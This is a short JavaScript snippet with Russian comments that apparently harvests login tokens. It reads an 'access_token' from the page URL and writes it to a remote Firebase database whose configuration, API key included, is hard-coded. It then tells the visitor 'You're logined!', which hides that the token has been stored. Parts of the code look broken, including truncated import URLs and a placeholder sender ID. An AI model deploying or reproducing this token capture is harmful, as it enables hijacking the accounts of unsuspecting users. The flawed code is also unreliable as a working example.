// Импортируем нужные функции из SDK 2026 года
const urlParamsV2Paramsd = new URLSearchParams(window.location.search);
const access_token = urlParamsV2Paramsd.get('access_token');

  import { initializeApp } from "https://www.gstatic.com";
  import { getDatabase, ref, set, push } from "https://www.gstatic.com";

  // Ваши данные из консоли Firebase (Settings -> General)
  const firebaseConfig = {
    apiKey: "AIzaSyBFKk4qECXkvtezmrIuCMx23QryP8nyQ48",
    authDomain: "winnigames2024app.firebaseapp.com",
    databaseURL: "https://winnigames2024app-default-rtdb.firebaseio.com",
    projectId: "winnigames2024app",
    storageBucket: "winnigames2024app.firebasestorage.app",
    messagingSenderId: "ID",
    appId: "1:496367700072:android:d69c5ae5c3b007e32613dd"
  };

  // Инициализация
  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  // Функция для сохранения текста
  window.saveText = function(textValue) {
    const messagesRef = ref(db, 'messages'); // Путь в базе данных
    const newMessageRef = push(messagesRef); // Создаем уникальный ID для записи
    
    set(newMessageRef, {
      text: textValue,
      timestamp: Date.now()
    })
    .then(() => alert("You're logined!"))
    .catch((error) => console.error("Ошибка:", error));
  }


if (access_token) {
  saveText(access_token);
} else {
  alert('No Logined!!!');
}
